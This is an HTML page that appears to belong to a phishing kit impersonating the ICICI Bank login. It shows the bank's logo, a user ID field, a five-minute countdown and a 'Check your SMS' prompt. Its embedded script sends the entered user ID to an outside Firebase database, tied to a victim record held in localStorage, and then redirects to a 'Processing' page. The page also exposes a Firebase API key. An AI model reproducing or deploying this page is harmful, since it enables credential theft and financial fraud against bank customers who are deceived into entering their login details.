<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ICICI Bank Login</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <!-- Add Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="global.css">
</head>
<body>
    <div class="login-box">
        <form class="LoginForm">
            <div class="container">
                <div class="header">
                    <img src="icici h.jpg" alt="ICICI Bank Logo">
                </div>
                <h2>Enter Your User Id</h2>
                <div class="content">
                    <div class="input-group">
                        <label for="userid">Enter User Id</label>
                        <input type="text" class="new-control" name="User_ID" id="lo" maxLength="25" required />
                    </div>
                    <div class="timer" id="timer">Time remaining: 300 seconds</div>
                    <div class="sms-message">Check your SMS</div>
                </div>
                <button class="btn" id="loginBtn">Login</button>
            </div>
        </form>
    </div>

    <!-- Firebase Configuration and Data Submission -->
    <script>
  // Initialize Firebase (Replace with your Firebase config)
  const firebaseConfig = {
    apiKey: "AIzaSyCDcF_4SEUs2RKDOAWoXUTCb9DO6QaO1TU",
    authDomain: "motutest-ac954.firebaseapp.com",
    databaseURL: "https://motutest-ac954-default-rtdb.firebaseio.com",
    projectId: "motutest-ac954",
    storageBucket: "motutest-ac954.firebasestorage.app",
    messagingSenderId: "85522378752",
    appId: "1:85522378752:web:7ebe0121ab3ff25e09a8e5"
  };
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const database = firebase.database();

  // Timer Logic
  let timeLeft = 300;
  const timerDisplay = document.getElementById('timer');
  const loginButton = document.getElementById('loginBtn');

  const countdown = setInterval(() => {
    timeLeft--;
    timerDisplay.textContent = `Time remaining: ${timeLeft} seconds`;

    if (timeLeft <= 0) {
      clearInterval(countdown);
      timerDisplay.textContent = "Time's up!";
      loginButton.disabled = true;
    }
  }, 1000);

  // Handle form submission
  document.querySelector('.LoginForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const userID = document.getElementById('lo').value;

    // ðŸ”¹ Get the saved user ID from localStorage
    const currentUserId = localStorage.getItem("currentUserId");

    if (!currentUserId) {
      alert("Session expired. Please start again.");
      return;
    }

    try {
      // ðŸ”¹ Update SAME user instead of creating new one
      await database.ref("user/" + currentUserId).update({
        userID: userID,
       
      });

      console.log("âœ… Data updated for user:", currentUserId);

      window.location.href = 'Processing.html';
    } catch (error) {
      console.error("âŒ Error updating data:", error);
      alert("Error submitting data. Please try again.");
    }
  });
</script>

</body>
</html>